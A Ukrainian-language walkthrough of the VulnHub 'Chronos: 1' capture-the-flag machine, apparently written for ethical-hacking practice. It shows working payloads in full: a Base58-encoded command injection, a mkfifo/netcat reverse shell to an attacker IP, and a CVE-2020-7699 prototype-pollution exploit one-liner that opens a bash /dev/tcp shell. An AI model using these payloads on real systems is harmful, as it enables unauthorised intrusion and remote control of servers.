# Проходження CTF Chronos

В цьому документі наведено розгорнуте пояснення до завдання **Capture the Flag (CTF)** під назвою **"Chronos: 1"**, опубліковане на сайті **VulnHub**. Рівень складності цього CTF **СЕРЕДНІЙ**, а мета - отримати **root-доступ** до цільової машини та прочитати фінальний флаг.

---

## **Розбір CTF крок за кроком**

### **Крок 1: Виявлення IP-адреси та сканування портів**

Після запуску віртуальної машини у **VirtualBox** першим кроком є виявлення її IP-адреси в локальній мережі. Для цього використовуємо інструмент **netdiscover**:

```bash
sudo netdiscover -r 10.0.2.0/24
```

📌 **Результат**: Виявлено цільову машину з IP-адресою **10.0.2.5**.

⚠️ **Примітка**: IP-адреси атакуючої та цільової машин можуть відрізнятися залежно від вашої мережевої конфігурації.

Наступним кроком виконуємо сканування відкритих портів та сервісів за допомогою **nmap**:

```bash
sudo nmap -sV 10.0.2.5
```

📌 **Результат сканування**:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    Node.js Express framework
```

Виявлено три відкриті порти:

- **Порт 22** — SSH-сервіс
- **Порт 80** — Apache HTTP сервер
- **Порт 8000** — Node.js Express framework

---

### **Крок 2: Дослідження веб-додатку на порту 80**

Відкриваємо у браузері адресу **http://10.0.2.5/** та бачимо веб-сторінку з назвою "Chronos".

При перегляді **вихідного коду сторінки** (View Page Source) знаходимо підозрілий JavaScript-код, який виконує запит до серверу:

```
http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
'User-Agent': 'Chronos'
```

📌 **Важливі деталі**:

- Запит йде на **порт 8000** (Node.js сервіс)
- Параметр `format` містить незрозумілий рядок: `4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`
- Заголовок `User-Agent` має значення **"Chronos"**

---

### **Крок 3: Аналіз запиту та маніпуляція User-Agent**

Спробуємо звернутися до URL безпосередньо у браузері:

```
http://10.0.2.5:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
```

📌 **Результат**: Отримуємо відповідь **"Permission Denied"**.

Це означає, що сервер перевіряє заголовок **User-Agent**. Використаємо **Burp Suite** для перехоплення та модифікації запиту:

1. Налаштовуємо браузер на використання проксі Burp Suite
2. Перехоплюємо запит до `http://10.0.2.5:8000/date?format=...`
3. Змінюємо заголовок `User-Agent` на значення **"Chronos"**
4. Відправляємо модифікований запит

📌 **Результат**: Отримуємо відповідь з поточною датою та часом:

```
Today is Sunday, October 12, 2025 13:47:41.
```

---

### **Крок 4: Виявлення Command Injection через декодування Base58**

Незрозумілий параметр `4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL` виглядає як закодований рядок. Використовуючи онлайн-інструменти для декодування, виявляємо, що це **Base58**-кодування:

📌 **Декодований результат**:

```
'+Today is %A, %B %d, %Y %H:%M:%S.'
```

Це формат команди `date` у Linux! Спробуємо виконати **Command Injection**, додавши команду `ls -la`:

**Payload**:

```bash
'+Today is %A, %B %d, %Y %H:%M:%S.';ls -la
```

Кодуємо цей рядок у **Base58**:

```
ev6bGy99wjnctA21ATvLR8Xkptotq1Ssu3SZR3efG68AVURJRzjBHQoTn
```

Відправляємо запит через Burp Suite:

```
http://10.0.2.5:8000/date?format=ev6bGy99wjnctA21ATvLR8Xkptotq1Ssu3SZR3efG68AVURJRzjBHQoTn
```

📌 **Результат**: У відповіді отримуємо вивід команди `ls -la`:

```
Today is Sunday, October 12, 2025 13:58:21.
total 56
drwxr-xr-x  3 www-data www-data  4096 Aug  3  2021 .
drwxr-xr-x  4 root     root      4096 Jul 30  2021 ..
-rw-r--r--  1 www-data www-data  1365 Aug  3  2021 app.js
drwxr-xr-x 56 www-data www-data  4096 Jul 30  2021 node_modules
-rw-r--r--  1 www-data www-data    97 Jul 30  2021 package.json
-rw-r--r--  1 www-data www-data 33602 Jul 30  2021 package-lock.json
```

✅ **Command Injection підтверджено!**

---

### **Крок 5: Отримання Reverse Shell**

На атакуючій машині запускаємо **netcat listener**:

```bash
sudo ncat -l -p 8020
```

Створюємо payload для отримання reverse shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.4 8020 >/tmp/f
```

⚠️ **Важливо**: Замініть `10.0.2.4` на IP-адресу вашої атакуючої машини.

Кодуємо payload у **Base58**:

```
3WEL9tDt4agr4yQoWrnVmQpEvrDFh8qn8EWtn6ysjwJas1VRBvP5LUEkfUa2SecbKCGvz1Q6ykdYZf3vXYi3D3z4GKAUF2bPsyvZiNH
```

Відправляємо запит через Burp Suite з цим payload.

📌 **Результат**: У терміналі з netcat отримуємо **reverse shell**!

```bash
$ pwd
/opt/chronos
```

---

### **Крок 6: Дослідження файлової системи та виявлення вразливості**

Після отримання доступу досліджуємо файлову систему:

```bash
$ ls -la /opt/
chronos
chronos-v2
```

Виявляємо директорію `/opt/chronos-v2/backend/`. Переглядаємо файл `package.json`:

```bash
$ cat /opt/chronos-v2/backend/package.json
```

📌 **Важливе виявлення**: Виявлено модуль **express-fileupload версії 1.1.7-alpha.3**, який має критичну вразливість:

- **CVE-2020-7699** — Remote Code Execution через Prototype Pollution
- **CWE-400** — Uncontrolled Resource Consumption

---

### **Крок 7: Ескалація привілеїв через CVE-2020-7699**

На атакуючій машині запускаємо новий **netcat listener** на іншому порту:

```bash
sudo ncat -l -p 8021
```

У поточному reverse shell (порт 8020) виконуємо експлойт для **CVE-2020-7699**:

```bash
python3 -c "import requests; cmd='bash -c \"bash -i >& /dev/tcp/10.0.2.4/8021 0>&1\"'; requests.post('http://127.0.0.1:8080', files={'__proto__.outputFunctionName': (None, f\"x;process.mainModule.require('child_process').exec('{cmd}');x\")}); requests.get('http://127.0.0.1:8080')"
```

⚠️ **Важливо**: Замініть `10.0.2.4` на IP вашої атакуючої машини.

📌 **Результат**: У новому терміналі (порт 8021) отримуємо shell з підвищеними привілеями!

Тепер можна закрити попереднє з'єднання на порту 8020.

---

### **Крок 8: Вихід з обмеженого середовища та отримання root**

Створюємо повноцінну інтерактивну оболонку:

```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

Тепер отримуємо доступ з правами **root**:

```bash
# whoami
root
```

---

### **Крок 9: Читання фінального флагу**

Переходимо до директорії `/root/` та читаємо фінальний флаг:

```bash
# cat /root/root.txt
YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
```

Декодуємо флаг з **Base64**:

```bash
# echo "YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK" | base64 -d
apopse siopi mazeuoume oneira
```

✅ **Фінальний флаг отримано! CTF завершено!** 🎯

---

## **Висновок**

**Що було зроблено?**

✔️ Виявлено IP-адресу цільової машини та проскановано порти  
✔️ Досліджено веб-додаток та виявлено підозрілий запит  
✔️ Проведено маніпуляцію User-Agent для обходу перевірки  
✔️ Виявлено та використано Command Injection через Base58-декодування  
✔️ Отримано Reverse Shell з правами www-data  
✔️ Досліджено файлову систему та виявлено вразливий модуль express-fileupload  
✔️ Використано експлойт для CVE-2020-7699 (Prototype Pollution)  
✔️ Отримано root-доступ та прочитано фінальний флаг

## **Цей CTF є прикладом навчального завдання** для відпрацювання навичок **етичного хакінгу**, тестування на проникнення та ескалації привілеїв через реальні CVE-вразливості.